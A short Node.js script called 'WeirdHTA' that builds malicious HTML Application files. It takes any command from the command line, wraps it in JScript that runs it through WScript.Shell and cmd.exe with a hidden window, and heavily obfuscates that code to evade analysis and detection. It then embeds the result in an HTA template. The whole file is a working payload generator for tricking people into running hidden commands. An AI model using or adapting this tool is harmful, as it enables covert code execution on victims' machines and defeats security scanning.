// WeirdHTA

const fs = require('fs')
var JavaScriptObfuscator = require('javascript-obfuscator');
const args = process.argv;

function rstring() {
	let r = Math.random().toString(36).substring(7);
	return r;
}

function gen(payload) {
	var buffer = fs.readFileSync("template/test.hta");
	var data = buffer.toString()
	let l = data.replace(/STRINGRANDOM/g, rstring()).replace('ECONTENT', payload);
	return l
}

function e(payload) {
	var obfuscationResult = JavaScriptObfuscator.obfuscate(
		`
		${payload}
		`,
		{
			compact: true,
			controlFlowFlattening: true,
			debugProtection: true,
			log: false,
			disableConsoleOutput: true,
			rotateStringArray: true,
			stringArray: true,
		}
	);
	return obfuscationResult.getObfuscatedCode()
}


if (args[2] == null)
{
	console.log(`[+] Usage: node ${args[1]} "CMD"`);

} else {
	var cmd = args[2]
	var payload = `a=new ActiveXObject("WScript.Shell");a.run("cmd.exe /c ${cmd}", 0);window.close();`
	var ehta = e(payload)
	var hta = gen(ehta)
	console.log(hta);

}
